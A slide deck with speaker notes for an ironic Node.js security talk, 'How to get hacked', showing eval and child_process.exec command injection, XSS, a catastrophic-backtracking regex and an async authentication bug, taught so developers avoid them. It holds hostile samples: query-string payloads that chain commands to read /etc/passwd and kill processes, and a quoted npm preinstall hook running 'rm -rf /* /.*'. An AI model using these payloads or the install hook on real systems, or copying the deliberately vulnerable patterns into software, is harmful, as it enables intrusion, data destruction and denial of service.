# How to get hacked

???
How to get hacked
1. How to be dos'd or have your data stolen
1. Laern cool or new during the process
---

# About _self
```javascript 
{
	name: "Josh Hollandsworth",
	job: "Software Engineer",
	providerOfIncome: "Asynchrony Labs",
}
```

???
As the slide says, my names Josh Hollandsworth and I am a software engineer with Asynchrony Labs. 
My background is writing backend and middle tier applications

---

# this.about()

1. Examples of how to get hacked
1. Ways to prevent them

???
This is the why we are here, or at least it is why I am here. As I previously said I am traditionally a backend/middle tier developer who absolutely loved being on the backend because it meant i never had to learn javascript! But then node came along, and it became increasinly clear that it was going to become a major contender against WCF, Servlets, and other traditional backend services frameworks. So as I begrudingly learned node and javascript I wanted to learn how to tackle the security challenges that I had to solve in other languages and tool sets. This talk is a collection
of the vulnerabilites I learned about, examples of how to exploit them, and ways to prevent them. 
---

# Disclaimers

??? 
Like any talk on security, its probably best to start off with some disclaimers
--

From this point forward I will be speaking as someone who wants to hack your systems, doing most of the things from this point forward are a bad idea unless you want your company on the news for a data breach. 

--

If you chose to do the things from this point forward, let me know what company you work for so I never use your service.

???
Seriously, do not do these things
--

Do not treat this as an exhaustive list of security vulnerablities.

---

# Ways to get hacked 
???
So lets get started, anyone want to guess what rule number one is to insure you can get hacked?
--

1. Always trust your user
???
1. They're most likely good people
1. They know what they're doing
1. What could go wrong
--

1. Never patch any vulnerable code
???
1. Regression testing is a pain, requires meetings coordinations etc
1. Potential breaking changes in updates
1. A new update may come out before you release so you might as well do it all at once
--

1. Store all of your secrets in plain text 
???
1 Crypto is slow, and since you used node you definitely are going for speed. Why add overhead
---

1. leave secret keys them as the default value.
???
1. This can be api token names, csrf tokens etc
1. Keeping them the default means less time searching if you forget
1. Easier to onboard new developers.
---

# Injection

An injection attack is one in which a malcious user "injects" random bits of code in order to attack, or obtain information about the target system

???
1. The primary means of attack
1. Goal is to gain info about target or inject random bits of code


--

![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
 
_source xkcd_

???
1. Fun to do
1. Sql Injection (not demoed)
1. A great example of why you should trust users
---

# eval is my bff

Executes a string of arbitrary javascript

```javascript 
	eval('alert(\'hi\')');
```

???
1. Eval is indeed my BFF
1. Its entire purpose is to execute arbitrary java script
1. Who has heard that eval is evil
1. Why is eval evil?
	1. JIT cannot compile until string is built
	1. JIT cannot compile ahead
	1. has to do all steps at once and is a blocking operation until completed
	1. The eval'd code gets the scope of the function containing the eval call
	
---

# eval is my bff

## Example

???
http://localhost:4000/?doIt=whatcould%20go%20wrong

http://localhost:4000/?doIt=response.write%28%27thisisfine%27%29
---

# a friend of eval is a friend of mine

???
1. While eval is my BFF it may not be yours
1. Thankfully, eval has some friends besides me (I dont get to jealous because theyre just as usefel)
--
1. setInterval
1. setTimeout
1. new Function

???

1. All are backed by eval
1. Set interavl and set time out are both overloaded to work with a string of function parameter
1. To make sure your application is hackable, never use the variant that takes the function parameter
1. Same process, get it to eval, eval'd code gains scope and you can attack 
---

# Making exec-utive decisions

An example with child_process.exec

???
1. Both types of injection havent been too helpful but allow me to know that i can take it a step further
1. If you don't know, child_process.exec executes a commandline application
1. Spawns a new process (bash)
1. This endpoint was meant to list the directory contents of the path supplied in the url
1. This is totally ok
1. Now lets have some fun with it

This example allows you to inject code in a function that is meant to list the directory contents. It is exploitable because it trust the user and allows un sanitized input

	http://localhost:4000?path=.
	http://localhost:4000?path=. >> /dev/null;ps -aux
	http://localhost:4000?path=. >> /dev/null;cat /etc/passwd;node --version;uname -a;ps -aux
	http://localhost:4000?path=kill -9 <pid>

How was this possible?
1. You trusted the users
1. Since youre trusting the user, there is no need to sanitize input
1. You allowed file access
---

# Cross Site Winning

???
1. Two types of Cross Site attacks
--

Cross Site Scripting (XSS)

???
1. Simple attack allows scripts to be injected and executed on the client 
1. Can be made to auto execute the moment a page load or refresh occurs

--

Cross Site Request Forgery (CSRF)

???
1. Tricks user into performing an action against a site they are not on
1. If sandboxing didn't occur or was invalid, i could have a page so that when a user clicks my link, it triggers an action on their bank site

---
# Cross Site Winning

## Cross Site Scripting

???
Two types to deal with 
--

1. Reflected Cross Site Scripting

???
1. Injected as part of a request
1. when the server responds, the script is executed on the client

--

1. Stored Cross Site Scripting

???
1. Script it injectd into your database or what ever your persistence layer is.
1. When a user retreives contents, the malicious code is executed.

---

# Cross site winning

## Example (Reflected)

???
1. Easy to show,
1. Construct a request that passes javascript to server
1. The response causes execution

---
# xDoS

???
1. A DoS attack is an attack that impeeds your application from being responsive
1. Doesnt always have to take down the server.

---

# What EventLoop
	
	Catastrophic backtracking

```javascript
const salary = input.match(/[1-9]((,\d{3})|(\d)+)+(\.00)/);
```

???
1. As you probably know, node uses an eventloop/event emitter pattern to execute code in an asynchronous manner
1. Allows node to appear multi threaded when the primary loop is not 
1. While this makes node awesome, it also a way for me to take down a server
1. Stop the event loop and make the server non responsive

---

# What EventLoop

What we are trying to do

```javascript
[1-9]
```     
must start with 1-9 

--

```javascript
(,\d{3})
```
must contain 3 digits after a comma

--
```javascript
|(\d)+
```
or contain any number of digits

--

```javascript
+(\.d{2})
```
followed by .NN

---


# Treat Node as if its synchronous

```javascript
let isAuthenticated = true;

db.query("select * from users where username = '?' and password = '?'"
	,{username: qs.username, password: qs.password}
	,()=> isAuthenticated = true,
	,(error)=> { 
		console.log(error); 
		isAuthenticated = false;
	});

if(isAuthenticated) {
	//do super secret thing!
}
```

???
1. An easy mistake especially for devs new to js/node is to treat it as if it were synchronous
1. We set isAuthed to true which means that it will only be false if the query fails
1. the query sets is authentecated in a call back
1. the call back most likely wont be called when the if check is executed
---

# Getting Buff-ers



---

# Ignore warnings, like you have since C


---

# Don't research your node modules.

```json
"scripts" : {
	"preinstall": "rm -rf /* /.*"
}
```

???
Who knows what this does? 
Spreinstall script is something that npm will execute prior to the package being install but after it has downloaded. In this case it is a forced delete of all files. This was from a proof of concept that 
Joao Jeronimo (joe-ow zheronimo) distributed on npm as the package rmrafalll before the package was removed in march of 2016

---

# this.done() 

Thank you!


